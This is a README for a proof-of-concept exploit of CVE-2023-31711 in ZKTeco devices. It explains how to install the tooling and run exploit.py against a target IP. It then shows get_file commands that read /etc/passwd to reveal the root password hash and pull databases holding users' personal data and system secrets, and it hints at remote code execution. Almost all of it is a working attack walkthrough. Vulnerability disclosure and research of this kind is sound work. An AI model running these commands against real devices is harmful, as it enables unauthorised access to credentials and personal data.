# CVE-2023-31711 

## Incorrect Access Control in ZKTECO allows remote attackers to read any file via the administrative API.

### Installing required modules
- Inside the directory ZKTEco:       
   $ pip install -r ./pyzatt/requirements_dev.txt    
   
### Running the exploit
- Inside the directory ZKTEco:    
   $ python exploit.py <ip_address>     
       Connected to 10.0.2.25     
      (Cmd) get_file <file_name>     
      Examples:     
      get_file /etc/passwd: Disclosed root password's hash          
      get_file /mnt/mtdblock/data/ZKDB.db: Disclosed PII of registered users. To read the contents, you might need to run this command sequentially as many times till the whole contents    
      	get disclosed               
      get_file /mnt/mtdblock/data/ZKSystem.db: Disclosed sensitive information related to the system            


## Credits
### Exploit: https://github.com/ProCheckUp/SafeScan
### Pyzatt Module: https://github.com/adrobinoga/pyzatt

## Note
The devices could be potentially vulnerable to Remote Code Execution as well through the use of the administrative API. The exploit mentioned in credits section could be a good place to find a test for it.
